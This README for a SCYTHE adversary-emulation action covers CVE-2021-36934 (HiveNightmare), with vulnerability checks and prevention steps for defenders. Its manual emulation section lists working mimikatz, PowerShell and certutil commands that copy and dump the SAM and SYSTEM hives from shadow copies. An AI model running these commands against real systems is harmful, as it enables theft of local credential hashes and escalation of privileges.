# T1003.002 - OS Credential Dumping: Security Account Manager

This SCYTHE Compound Action checks the Windows system for CVE-2021-36934, an elevation of privilege vulnerability that allows any user to read and copy the Security Accounts Manager (SAM) database, and copies the SAM and SYSTEM hive for offline and online (using mimikatz) credential dumping.  For more about OS Credential Dumping: https://attack.mitre.org/techniques/T1003/002/

## Check if system is vulnerable
As a non-administrative user, run the following in a command prompt
- ```whoami /groups```
- ```sc query vss```
- ```vssadmin list shadows```
- ```icacls %windir%\system32\config\sam```

A vulnerable system will report ```BUILTIN\Users:(I)(RX)```

## Import the Compound Action into SCYTHE
1. From the SCYTHE GUI, click Threat Manager - Migrate Threats
2. Under "Import Threat" click “Choose File” and select the JSON file you downloaded from GitHub
3. Click Import and OK when complete
4. Click Threat Manager - Threat Catalog
5. Find the imported Compound Action and click the tag icon 
6. Tag the MITRE ATT&CK Technique for the Compound Action

## Attack Emulation with SCYTHE
1. Create a new campaign
2. Select the Compound Action for T1003.002
3. Note: you may need to change the HarddiskVolumeShadowCopy# to the backup available on the disk. You can identify that by using the ```vssadmin list shadows``` command.

## Manual Attack Emulation
- ```mimikatz "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\system /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\\sam"```
- ```powershell foreach($i in @("SYSTEM","SAM")){[System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\$i", "$i")}```
- ```certutil -encode \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\SYSTEM SYSTEM.encoded```
- ```certutil -decode SYSTEM.encoded SYSTEM.hive```
- ```certutil -encode \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\SAM SAM.encoded```
- ```certutil -decode SAM.encoded SAM.hive```
- ```powershell.exe -c "[Console]::OpenStandardInput().CopyTo([Console]::OpenStandardOutput())" <"\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SAM"> sam_export.txt```

## Prevention
Restrict access to %windir%\system32\config and remove VSS shadow copies. On a command prompt with administrative privileges:
- ```icacls %windir%\system32\config\*.* /inheritance:e```
- ```vssadmin delete shadows /for=c: /Quiet```
- ```vssadmin list shadows```
- Note: you must restrict access and delete shadow copies to prevent exploitation of this vulnerability

## References
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934
- https://twitter.com/jonasLyk/status/1417205166172950531
- https://attack.mitre.org/techniques/T1003/002/
- https://www.kb.cert.org/vuls/id/506989
- https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5
- https://github.com/GossiTheDog/HiveNightmare